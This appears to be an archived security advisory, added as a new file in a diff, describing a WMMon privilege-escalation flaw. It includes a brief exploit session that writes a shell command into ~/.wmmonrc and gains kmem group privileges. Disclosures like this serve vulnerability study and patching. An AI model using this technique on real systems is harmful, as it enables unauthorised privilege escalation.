@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/885/info
+
+WMMon is a multiple platform Window Maker docking application. It monitors useful system information such as CPU load and disk activity. The application also allows the user to define commands that can be launched by mouse clicks in the WMMon window. If the WMMon application is installed SUID or SGID, these privileges are not dropped before executing commands that have been defined by the user. Since the user can configure the application to execute any command, a user can run a shell or any other executable with the privileges that WMMon has been installed with. The FreeBSD ports version of WMMon installs SGID kmem and older versions installed it as SUID root. 
+
+Exploit:
+% id
+uid=1000(steve) gid=1000(steve) groups=1000(steve)
+% echo 'left /bin/sh' > ~/.wmmonrc
+% wmmon -display myworkstation.evilhacker.net:0.0
+Monitoring 2 devices for activity.
+{Left-click on the little window that appears}
+current stat is :1
+$ id
+uid=1000(steve) gid=1000(steve) egid=2(kmem) groups=2(kmem), 1000(steve) 
